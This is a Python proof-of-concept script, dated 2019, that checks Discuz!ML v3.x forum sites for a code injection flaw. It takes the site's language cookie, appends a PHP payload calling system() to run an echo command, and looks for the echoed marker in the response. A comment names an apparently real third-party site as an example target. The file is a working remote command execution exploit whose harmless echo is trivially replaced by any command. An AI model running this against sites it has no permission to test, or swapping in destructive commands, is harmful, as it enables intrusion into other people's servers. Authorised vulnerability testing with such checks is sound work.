#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @userVersion : python 3.7
# @Author  : fsrm
# @Data    : 2019/7/12
# @Effect  : discuzml-v-3-x-code-injection
# @Version : V1.0
import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def chuliurl(url):
    urllen = len(url.split("/")[-1])
    if urllen == 0:
        return url + "portal.php"
    else:
        return url[:-urllen] + "portal.php"

def get_cookie(headers):
    try:
        cookie=headers.get("Set-Cookie")
        rlang = r" (.{1,15}language=)"
        language = re.findall(rlang, cookie)
        return language[0]
    except:
        return ""

def main(url):
    url=chuliurl(url)
    try:
        r=requests.get(url,verify=False,timeout=10)
        cookie=get_cookie(r.headers)
        if "language" not in cookie:
            # print(url + " 漏洞不存在")
            return
        payload = {}
        payload["Cookie"] = cookie + "en'.system('echo vulnerability_exists').'"
        r = requests.get(url, verify=False, headers=payload, timeout=10)
        if "vulnerability_exists" in r.text:
            print(url + " 存在漏洞")
            return url
        else:
            print(url+" 漏洞不存在")
    except:
        print(url + " 漏洞不存在")
        return

if __name__ == '__main__':
    # url = "http://codersclub.org/discuzx/portal.php"
    if len(sys.argv)!=2:
        print("eg: python discuzml-v-3-x-code-injection_poc.py http://bbs.***.com/portal.php")
    else:
        url=sys.argv[1]
        main(url)
